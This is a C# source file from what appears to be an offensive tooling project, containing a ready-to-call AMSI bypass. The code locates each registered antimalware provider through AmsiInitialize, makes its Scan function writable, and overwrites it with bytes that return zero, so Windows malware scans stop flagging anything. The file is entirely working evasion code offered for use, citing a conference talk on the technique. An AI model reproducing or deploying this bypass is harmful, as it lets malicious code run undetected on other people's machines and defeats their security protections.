using System;
using System.Runtime.InteropServices;
using static CipherRun.Data.Enums;
using static CipherRun.Data.Delegates;
using static CipherRun.Helpers.Methods;

namespace CipherRun.Patchers
{
    /// <summary>
    /// This Class Will Provide a Ready To Call AMSI Bypasses
    /// </summary>
    public class Amsi
    {
        /// <summary>
        /// This Function Patches AMSI using Amsi Scan Interception Technique
        /// </summary>
        /// <remarks>https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf</remarks>
        public static void AmsiInterception()
        {
            
            IntPtr AmsiInitptr = GetLibraryAddress("amsi.dll", "AmsiInitialize", true);
            AmsiInitialize AmsiInitialize = Marshal.GetDelegateForFunctionPointer<AmsiInitialize>(AmsiInitptr);

            byte[] ZeroOut = { 0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3 }; /* a simple ret instruction */
            long ctx = 0;
            var p = 0;
            var i = 0;
            var PointerSize = IntPtr.Size;
            uint old = 0;

            AmsiInitialize("SuperScanner", out ctx);
            var CAmsiAntimalware = Marshal.ReadInt64((IntPtr)ctx, 16);
            var AntimalwareProvider = Marshal.ReadInt64((IntPtr)CAmsiAntimalware, 64);

            while (AntimalwareProvider != 0)
            {
                // Find the provider's Scan function
                var AntimalwareProviderVtbl = Marshal.ReadInt64((IntPtr)AntimalwareProvider);
                IntPtr AmsiProviderScanFunc = (IntPtr)Marshal.ReadInt64((IntPtr)AntimalwareProviderVtbl, 24);

                // Patch the Scan function

                NTSTATUS status = (NTSTATUS)NtProtectVirtualMemory((IntPtr)(-1), AmsiProviderScanFunc, (IntPtr)ZeroOut.Length, (uint)MEMORY_PROTECTION.PAGE_READWRITE, old);

                if (status == NTSTATUS.Success) { Marshal.Copy(ZeroOut, 0, AmsiProviderScanFunc, 6); }
                else { Console.WriteLine(""); }

                i++;
                AntimalwareProvider = Marshal.ReadInt64((IntPtr)CAmsiAntimalware, 64 + (i * PointerSize));

            }

        }




        /* Add More */


    }
}
